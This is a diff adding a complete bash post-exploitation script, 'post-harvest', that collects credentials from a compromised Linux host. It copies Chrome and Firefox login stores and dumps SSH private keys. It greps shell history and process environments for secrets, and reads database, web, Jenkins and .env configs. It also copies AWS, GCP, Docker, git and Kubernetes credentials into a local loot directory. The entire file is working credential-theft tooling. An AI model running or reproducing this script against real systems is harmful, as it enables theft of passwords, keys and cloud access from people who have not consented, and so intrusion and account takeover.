@@ -1,0 +1,308 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/post-harvest
+# Post-exploitation credential and data harvester
+# Grabs: browser creds, SSH keys, shell history, env secrets,
+#        service configs, cloud keys, git creds, docker configs
+#
+# Usage: post-harvest [all|browser|ssh|history|configs|cloud|quick] [outdir]
+
+LOOT_BASE="/opt/cardputer/loot/creds"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+OUTDIR="${2:-$LOOT_BASE/harvest_${TIMESTAMP}}"
+mkdir -p "$OUTDIR"
+
+OUTFILE="$OUTDIR/harvest.txt"
+KEYFILE="$OUTDIR/keys.txt"
+FOUND=0
+
+RED='\033[0;31m'
+CYAN='\033[0;36m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+hit()  { echo -e "${RED}[FOUND]${NC} $*" | tee -a "$OUTFILE"; FOUND=$(( FOUND + 1 )); }
+info() { echo -e "${CYAN}[*]${NC} $*" | tee -a "$OUTFILE"; }
+warn() { echo -e "${YELLOW}[?]${NC} $*" | tee -a "$OUTFILE"; }
+ok()   { echo -e "${GREEN}[+]${NC} $*" | tee -a "$OUTFILE"; }
+
+# ── Browser credentials ───────────────────────────────────────────────────────
+
+harvest_browsers() {
+    info "--- Browser Credentials ---"
+    local found=0
+
+    # Chrome/Chromium login data (SQLite)
+    local chrome_paths=(
+        "$HOME/.config/google-chrome/Default/Login Data"
+        "$HOME/.config/chromium/Default/Login Data"
+        "/home/*/.config/google-chrome/Default/Login Data"
+    )
+    for path in "${chrome_paths[@]}"; do
+        for f in $path; do
+            [ -r "$f" ] || continue
+            hit "Chrome Login DB: $f"
+            cp "$f" "$OUTDIR/chrome_login_data_$(basename "$(dirname "$(dirname "$f")")")" 2>/dev/null
+            # Try to read (only works if profile is unlocked)
+            python3 -c "
+import sqlite3, sys
+try:
+    db = sqlite3.connect(sys.argv[1])
+    rows = db.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
+    for url, user, pw in rows:
+        if user: print(f'URL:{url}  USER:{user}  PASS_ENC:{len(pw)}bytes')
+    db.close()
+except Exception as e: print(f'[!] {e}')
+" "$f" 2>/dev/null | tee -a "$OUTFILE"
+            found=1
+        done
+    done
+
+    # Firefox profiles
+    for ff_dir in /home/*/.mozilla/firefox/*.default* $HOME/.mozilla/firefox/*.default*; do
+        [ -d "$ff_dir" ] || continue
+        hit "Firefox profile: $ff_dir"
+        cp "$ff_dir/key4.db" "$OUTDIR/ff_key4_$(basename "$ff_dir").db" 2>/dev/null || true
+        cp "$ff_dir/logins.json" "$OUTDIR/ff_logins_$(basename "$ff_dir").json" 2>/dev/null || true
+        found=1
+    done
+
+    [ "$found" -eq 0 ] && info "No browser credential stores found"
+}
+
+# ── SSH keys ──────────────────────────────────────────────────────────────────
+
+harvest_ssh() {
+    info "--- SSH Keys & Known Hosts ---"
+
+    for dir in /root /home/*; do
+        [ -d "$dir/.ssh" ] || continue
+
+        # Private keys
+        for key in "$dir/.ssh/id_rsa" "$dir/.ssh/id_ed25519" "$dir/.ssh/id_ecdsa" "$dir/.ssh/id_dsa"; do
+            [ -r "$key" ] || continue
+            hit "SSH private key: $key ($(stat -c '%U' "$key"))"
+            cp "$key" "$OUTDIR/$(basename "$dir")_$(basename "$key")" 2>/dev/null
+            echo "--- $key ---" >> "$KEYFILE"
+            cat "$key" >> "$KEYFILE" 2>/dev/null
+        done
+
+        # authorized_keys — shows what keys are trusted
+        [ -r "$dir/.ssh/authorized_keys" ] && {
+            hit "authorized_keys: $dir/.ssh/authorized_keys"
+            cat "$dir/.ssh/authorized_keys" >> "$OUTFILE" 2>/dev/null
+        }
+
+        # known_hosts — reveals infrastructure
+        [ -r "$dir/.ssh/known_hosts" ] && {
+            info "known_hosts: $dir/.ssh/known_hosts ($(wc -l < "$dir/.ssh/known_hosts") entries)"
+            cp "$dir/.ssh/known_hosts" "$OUTDIR/$(basename "$dir")_known_hosts" 2>/dev/null
+        }
+
+        # SSH config — reveals jump hosts, ProxyCommands
+        [ -r "$dir/.ssh/config" ] && {
+            hit "SSH config: $dir/.ssh/config"
+            cp "$dir/.ssh/config" "$OUTDIR/$(basename "$dir")_ssh_config" 2>/dev/null
+            grep -iE "Hostname|User|IdentityFile|ProxyCommand|ProxyJump" "$dir/.ssh/config" | tee -a "$OUTFILE"
+        }
+    done
+}
+
+# ── Shell history ─────────────────────────────────────────────────────────────
+
+harvest_history() {
+    info "--- Shell History (credential patterns) ---"
+
+    local hist_files=()
+    for dir in /root /home/*; do
+        for hf in .bash_history .zsh_history .ash_history .sh_history .history .fish_history; do
+            [ -r "$dir/$hf" ] && hist_files+=("$dir/$hf")
+        done
+    done
+
+    for hf in "${hist_files[@]}"; do
+        local matches
+        matches=$(grep -iE "(pass|passwd|password|secret|token|key|api|auth|cred|bearer|curl.*-u |curl.*--user |mysql.*-p|psql.*:|sshpass|ldap.*password)" "$hf" 2>/dev/null | \
+            grep -v "^#" | head -30)
+        if [ -n "$matches" ]; then
+            hit "Credentials in history: $hf"
+            echo "$matches" | tee -a "$OUTFILE"
+            cp "$hf" "$OUTDIR/$(basename "$(dirname "$hf")")_history" 2>/dev/null
+        fi
+    done
+}
+
+# ── Environment and process env ───────────────────────────────────────────────
+
+harvest_env() {
+    info "--- Environment Variables ---"
+
+    # Current env
+    env | grep -iE "PASSWORD|SECRET|KEY|TOKEN|API|AUTH|CRED|DB_PASS|DATABASE_URL" 2>/dev/null | while IFS= read -r line; do
+        hit "ENV: $line"
+    done
+
+    # /proc/<pid>/environ for running processes
+    for env_file in /proc/*/environ; do
+        [ -r "$env_file" ] || continue
+        local pid
+        pid=$(echo "$env_file" | cut -d/ -f3)
+        local exe
+        exe=$(readlink "/proc/$pid/exe" 2>/dev/null || echo "unknown")
+        local creds
+        creds=$(cat "$env_file" 2>/dev/null | tr '\0' '\n' | grep -iE "PASSWORD|SECRET|TOKEN|API_KEY|DB_PASS" || true)
+        [ -n "$creds" ] && hit "Process env ($exe PID $pid): $(echo "$creds" | head -3)"
+    done
+}
+
+# ── Config files ──────────────────────────────────────────────────────────────
+
+harvest_configs() {
+    info "--- Config Files with Credentials ---"
+
+    # Known credential-bearing config locations
+    local targets=(
+        "/etc/mysql/my.cnf"
+        "/etc/mysql/mysql.conf.d/*.cnf"
+        "/var/www/html/wp-config.php"
+        "/var/www/html/*/wp-config.php"
+        "/var/www/*/wp-config.php"
+        "/etc/phpmyadmin/config.inc.php"
+        "/opt/*/config.php"
+        "/opt/*/config.yml"
+        "/opt/*/config.yaml"
+        "/opt/*/config.json"
+        "/opt/*/application.properties"
+        "/opt/*/database.yml"
+        "/etc/gitlab/gitlab.rb"
+        "/home/*/.gitconfig"
+        "/root/.gitconfig"
+        "/etc/gitconfig"
+        "/home/*/.netrc"
+        "/root/.netrc"
+        "/home/*/.ftpconfig"
+        "/home/*/.pgpass"
+        "/root/.pgpass"
+        "/etc/cups/printers.conf"
+        "/etc/vsftpd.conf"
+        "/etc/pure-ftpd/*.conf"
+        "/var/lib/jenkins/credentials.xml"
+        "/home/*/.jenkins/credentials.xml"
+    )
+
+    for pattern in "${targets[@]}"; do
+        for f in $pattern; do
+            [ -r "$f" ] || continue
+            local creds
+            creds=$(grep -iE "password|passwd|secret|key|token" "$f" 2>/dev/null | \
+                grep -v "^#\|^;" | head -5)
+            [ -n "$creds" ] || continue
+            hit "Config creds: $f"
+            echo "$creds" | tee -a "$OUTFILE"
+            cp "$f" "$OUTDIR/config_$(echo "$f" | tr '/' '_')" 2>/dev/null
+        done
+    done
+
+    # .env files anywhere in webroot
+    find /var/www /opt /srv 2>/dev/null -name ".env" -readable | while IFS= read -r f; do
+        hit ".env file: $f"
+        cp "$f" "$OUTDIR/env_$(echo "$f" | tr '/' '_')" 2>/dev/null
+        cat "$f" | grep -v "^#" | tee -a "$OUTFILE"
+    done
+}
+
+# ── Cloud credentials ─────────────────────────────────────────────────────────
+
+harvest_cloud() {
+    info "--- Cloud & API Credentials ---"
+
+    # AWS
+    for awscred in /root/.aws/credentials /home/*/.aws/credentials; do
+        [ -r "$awscred" ] || continue
+        hit "AWS credentials: $awscred"
+        cp "$awscred" "$OUTDIR/aws_credentials_$(dirname "$awscred" | tr '/' '_')" 2>/dev/null
+        cat "$awscred" | tee -a "$OUTFILE"
+    done
+
+    # GCP
+    for gcpdir in /root/.config/gcloud /home/*/.config/gcloud; do
+        [ -d "$gcpdir" ] || continue
+        hit "GCP config dir: $gcpdir"
+        find "$gcpdir" -name "*.json" -readable | while IFS= read -r f; do
+            cp "$f" "$OUTDIR/gcp_$(basename "$f")" 2>/dev/null
+            hit "GCP cred file: $f"
+        done
+    done
+
+    # Azure
+    for azdir in /root/.azure /home/*/.azure; do
+        [ -d "$azdir" ] || continue
+        hit "Azure config: $azdir"
+    done
+
+    # Docker registry auth
+    for dcred in /root/.docker/config.json /home/*/.docker/config.json; do
+        [ -r "$dcred" ] || continue
+        hit "Docker registry auth: $dcred"
+        cp "$dcred" "$OUTDIR/docker_config_$(dirname "$dcred" | tr '/' '_').json" 2>/dev/null
+        cat "$dcred" | tee -a "$OUTFILE"
+    done
+
+    # Git credentials
+    for gitcred in /root/.git-credentials /home/*/.git-credentials; do
+        [ -r "$gitcred" ] || continue
+        hit "Git credentials: $gitcred"
+        cat "$gitcred" | tee -a "$OUTFILE"
+    done
+
+    # Kubernetes
+    for kubeconf in /root/.kube/config /home/*/.kube/config; do
+        [ -r "$kubeconf" ] || continue
+        hit "Kubernetes config: $kubeconf"
+        cp "$kubeconf" "$OUTDIR/kube_config_$(dirname "$kubeconf" | tr '/' '_')" 2>/dev/null
+        grep -E "server:|token:|password:" "$kubeconf" | tee -a "$OUTFILE"
+    done
+}
+
+# ── Summary ───────────────────────────────────────────────────────────────────
+
+summary() {
+    echo ""
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  Harvest complete: ${RED}${BOLD}$FOUND${NC} item(s) found"
+    echo "  Output dir: $OUTDIR"
+    echo "  Full log:   $OUTFILE"
+    [ -s "$KEYFILE" ] && echo -e "  SSH keys:   ${RED}$KEYFILE${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+MODE="${1:-all}"
+case "$MODE" in
+    all)
+        harvest_browsers
+        harvest_ssh
+        harvest_history
+        harvest_env
+        harvest_configs
+        harvest_cloud
+        ;;
+    browser)    harvest_browsers ;;
+    ssh)        harvest_ssh ;;
+    history)    harvest_history ;;
+    env)        harvest_env ;;
+    configs)    harvest_configs ;;
+    cloud)      harvest_cloud ;;
+    quick)
+        harvest_ssh
+        harvest_history
+        harvest_env
+        ;;
+    *)
+        echo "Usage: post-harvest [mode] [outdir]"
+        echo "Modes: all (default) | browser | ssh | history | env | configs | cloud | quick"
+        exit 1
+        ;;
+esac
+
+summary
